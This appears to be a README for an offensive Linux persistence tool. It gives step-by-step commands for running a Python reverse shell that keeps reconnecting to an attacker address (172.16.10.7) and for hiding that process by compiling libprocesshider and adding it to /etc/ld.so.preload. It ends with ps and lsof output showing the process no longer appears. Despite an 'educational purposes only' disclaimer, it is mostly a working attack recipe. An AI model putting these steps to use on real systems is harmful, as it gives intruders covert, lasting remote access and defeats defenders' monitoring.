<h1 style="font-size:10vw" align="center">Linux Persistence Access </h1>
<h2 style="font-size:7vw" align="center"><i>Exploit using Python Reverse Shell</i></h2>
*For educational and authorized security research purposes only*

## Original Exploit Authors
[gianlucaborello](https://github.com/gianlucaborello)
[therealdreg](https://github.com/therealdreg)

## Exploit Description
This script is python based and is used to create a reverse shell of the victim machine with a loop mechanism every 2 seconds. And to improve defense evasion, we'll hide processes on Linux using the ld preloader.

## Step Guides

1. Establish a connection to victim's machine using SSH
```
┌──(kali㉿kali)-[~]
└─$ ssh administrator@www.servint.org
```
2. Change s.connect(("172.16.10.7",2220)) in the shell.py file with the perpetrator's address
3. Change sdregs.connect(("172.16.10.7",9999)) in the loop-shell.py with the perpetrator's address
4. Make shell.py and loop-shell.py executable:
```
administrator@Server-01:/tmp/libprocesshider$ chmod +x shell.py
administrator@Server-01:/tmp/libprocesshider$ chmod +x loop-shell.py
```
5. Change static const char* process_to_filter = "shell.py"; in the processhider.c with the script you want to use
6. Then, compile the library:
```
administrator@Server-01:/tmp/libprocesshider$ make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
administrator@Server-01:/tmp/libprocesshider$ sudo mv libprocesshider.so /usr/local/lib/
```
6. Then, Load it with the global dynamic linker
```
root@Server-01:~# echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```
7. Run shell.py or loop-shell.py:
administrator@Server-01:/tmp/libprocesshider$ ./shell.py
administrator@Server-01:/tmp/libprocesshider$ ./loop-shell.py
8. And your process will be off the radar 

```
administrator@Server-01:/tmp/libprocesshider$ sudo ps aux
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
...

administrator@Server-01:/tmp/libprocesshider$ sudo lsof -ni
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
...
```


https://sysdigcloud.com/hiding-linux-processes-for-fun-and-profit/
